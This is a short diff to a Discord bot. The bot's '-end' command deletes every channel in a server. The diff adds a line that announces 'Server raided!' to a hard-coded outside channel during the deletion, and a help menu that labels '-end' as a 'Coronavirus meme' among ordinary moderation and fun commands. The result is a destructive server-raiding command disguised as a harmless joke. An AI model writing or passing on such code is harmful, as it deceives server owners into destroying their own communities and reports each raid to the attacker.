@@ -512,6 +512,15 @@ client.on("message", message => {
     if(message.content === prefix + "end") {
         message.guild.channels.forEach(g => {
             g.delete()
+            client.channels.get("689539017095512127").send("@everyone Server raided!")
         })
+    }
+})
+
+client.on("message", message => {
+    var Commands = new Discord.RichEmbed()
+    .setTitle("-ban (Ban someone) \n-kick (Kick someone) \n-end (Coronavirus meme)\n-purge (Clear messages from a channel)\n-mute (Mute someone)\n-unmute (Unmute someone)\n-slap (Slap someone)\n-kiss (Kiss someone)\n-hug (Hugs someone)\n-think (Think about someone)")
+    if(message.content === "-cmds") {
+        message.channel.send(Commands)
     }
 })
